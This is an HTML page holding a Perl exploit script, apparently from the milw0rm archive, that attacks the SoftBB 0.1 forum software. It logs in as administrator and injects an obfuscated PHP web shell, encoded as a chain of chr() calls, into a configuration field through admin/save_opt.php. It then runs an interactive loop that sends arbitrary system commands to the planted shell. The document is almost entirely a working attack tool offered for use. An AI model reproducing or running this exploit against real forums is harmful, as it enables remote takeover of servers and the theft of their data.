<html><head><title>SoftBB 0.1 (cmd) Remote Command Execution Exploit</title></head><pre>#!/usr/bin/perl
#
# Affected.scr..: SoftBB 0.1
# Poc.ID........: 11060904
# Type..........: PHP code execution, SQL Injection, Full Path Disclosure
# Risk.level....: High
# Vendor.Status.: Unpatched
# Src.download..: softbb.be
# Poc.link......: acid-root.new.fr/poc/11060904.txt
# Advisory.link.: acid-root.new.fr/advisories/10060904.txt
# Credits.......: DarkFig (vuln/exploit/shellcode)
#
use Getopt::Long;
use HTTP::Cookies;
use HTTP::Request;
use HTTP::Request::Common &quot;POST&quot;;
use HTTP::Response;
use LWP::UserAgent;

print STDOUT &quot;\n+&quot;, '-' x 69, &quot;+\n&quot;;
print STDOUT &quot;|            SoftBB 0.1 Remote PHP Code Execution Exploit             |\n&quot;;
print STDOUT '+', '-' x 69, &quot;+\n&quot;;

my($host,$path,$admin,$passwd,$proxh,$proxu,$proxp);
my $opt = GetOptions(
   'host=s'   =&gt;  \$host,
   'path=s'   =&gt;  \$path,
   'admin=s'  =&gt;  \$admin,
   'passwd=s' =&gt;  \$passwd,
   'proxh=s'  =&gt;  \$proxh,
   'proxu=s'  =&gt;  \$proxu,
   'proxp=s'  =&gt;  \$proxp);
   
if(!$host or !$admin or !$passwd) {
    print STDOUT &quot;| Usage: ./xx.pl --host=[www] --path=[/] --admin=[root] --passwd=[XD] |\n&quot;;
    print STDOUT &quot;| [Options] : --proxh=[host] --proxu=[username] --proxp=[password] ---|\n&quot;;
    print STDOUT '+', '-' x 69, &quot;+\n&quot;;
    exit(0);
}

if($host  !~ /http/) {$host = 'http://'.$host;}
if($proxh !~ /http/ &amp;&amp; $proxh != '') {$proxh = 'http://'.$proxh.'/';}
if(!$path) {$path = '/';}

my $cc = HTTP::Cookies-&gt;new();
my $ua = LWP::UserAgent-&gt;new();
   $ua-&gt;cookie_jar($cc);
   $ua-&gt;agent('0xzilla');
   $ua-&gt;timeout(30);
   $ua-&gt;proxy(['http'] =&gt; $proxh) if $proxh;

my $re = POST $host.$path.'login.php', [
         'pseudolog' =&gt; $admin,
         'mdp'       =&gt; $passwd,
         'souvenir'  =&gt; 'auto',
         'Submit'    =&gt; 'Connexion'
         ];
   $re-&gt;proxy_authorization_basic($proxu, $proxp) if $proxp;
   $ua-&gt;request($re);

my $re = $ua-&gt;get($host.$path.'admin/gest_opt.php');

if($re-&gt;content =~ /Administration/) {
   print STDOUT &quot; [+]Login successful&quot;;} else {
   print STDOUT &quot; [-]Error during login&quot;;
   print STDOUT '+', '-' x 69, &quot;+\n&quot;;
   exit(0);}

if($re-&gt;content =~ /&lt;input type=&quot;text&quot; name=&quot;nomduforum&quot;  value=&quot;(.*?)&quot; class=&quot;bouton&quot; \/&gt;/) {
   $conf[0] = $1;} else {
   $conf[0] = 'Titre';}

if($re-&gt;content =~ /&lt;input type=&quot;text&quot; name=&quot;mailadmin&quot; value=&quot;(.*?)&quot; class=&quot;bouton&quot; \/&gt;/) {
   $conf[1] = $1; } else {
   $conf[1] = 'root@you.com';}

   # Bypass magic_quotes_gpc and register_globals limits
   # if(isset($_GET['cmd'])){system(stripslashes($_GET['cmd']));}

my $shcode  = &quot;\n&quot;.'$shcode  = chr(0x69).chr(0x66).chr(0x28).chr(0x69).chr(0x73).chr(0x73).chr(0x65);';
   $shcode .= &quot;\n&quot;.'$shcode .= chr(0x74).chr(0x28).chr(0x24).chr(0x5F).chr(0x47).chr(0x45).chr(0x54);';
   $shcode .= &quot;\n&quot;.'$shcode .= chr(0x5B).chr(0x27).chr(0x63).chr(0x6D).chr(0x64).chr(0x27).chr(0x5D);';
   $shcode .= &quot;\n&quot;.'$shcode .= chr(0x29).chr(0x29).chr(0x7B).chr(0x73).chr(0x79).chr(0x73).chr(0x74);';
   $shcode .= &quot;\n&quot;.'$shcode .= chr(0x65).chr(0x6D).chr(0x28).chr(0x73).chr(0x74).chr(0x72).chr(0x69);';
   $shcode .= &quot;\n&quot;.'$shcode .= chr(0x70).chr(0x73).chr(0x6C).chr(0x61).chr(0x73).chr(0x68).chr(0x65);';
   $shcode .= &quot;\n&quot;.'$shcode .= chr(0x73).chr(0x28).chr(0x24).chr(0x5F).chr(0x47).chr(0x45).chr(0x54);';
   $shcode .= &quot;\n&quot;.'$shcode .= chr(0x5B).chr(0x27).chr(0x63).chr(0x6D).chr(0x64).chr(0x27).chr(0x5D);';
   $shcode .= &quot;\n&quot;.'$shcode .= chr(0x29).chr(0x29).chr(0x3B).chr(0x7D).chr(0x0D).chr(0x0A);';
   $shcode .= &quot;\n&quot;.'eval($shcode);//';

my $re = POST $host.$path.'admin/save_opt.php', [
         'nomduforum'       =&gt; $conf[0],        'url'              =&gt; $host.$path,
         'mailadmin'        =&gt; $conf[1],        'smtp'             =&gt; '',
         'nbsondage'        =&gt; 0,               'gzip'             =&gt; 'false',
         'autmodpseudo'     =&gt; 'false',         'afflistdelauto'   =&gt; 'true',
         'autorisationsign' =&gt; 'true',          'bbcodesign'       =&gt; 'true',
         'ipaff'            =&gt; 'true',          'affreprapide'     =&gt; 'false',
         'mailconf'         =&gt; 'false',         'cache_forum'      =&gt; &quot;false; $shcode&quot;,
         'lockforum'        =&gt; 'false',         'message_de_lock'  =&gt; '',
         'lmax'             =&gt; 0,               'hmax'             =&gt; 0,
         'pmax'             =&gt; 0,               'tmpfreepost'      =&gt; 0,
         'membreparpage'    =&gt; 0,               'postparpage'      =&gt; 0,
         'postparpageaff'   =&gt; 0,               'Submit'           =&gt; 'Enregistrer+les+options',
         ];

my $da = $ua-&gt;request($re);
if($da-&gt;content =~ /Enregistrement/) {
   print STDOUT &quot;\n [+]Shellcode should be written !&quot;;}
   
while () {
       print STDOUT &quot;\n \$sh: &quot;;
       chomp($cmd = &lt;STDIN&gt;);
       my $da = $ua-&gt;get($host.$path.&quot;info_options.php?cmd=$cmd&quot;);
       print STDOUT $da-&gt;content;
       if($cmd eq &quot;exit&quot;) {
          print STDOUT '+', '-' x 69, &quot;+\n&quot;;
          exit(0);}
}

# milw0rm.com [2006-09-04]</pre></html>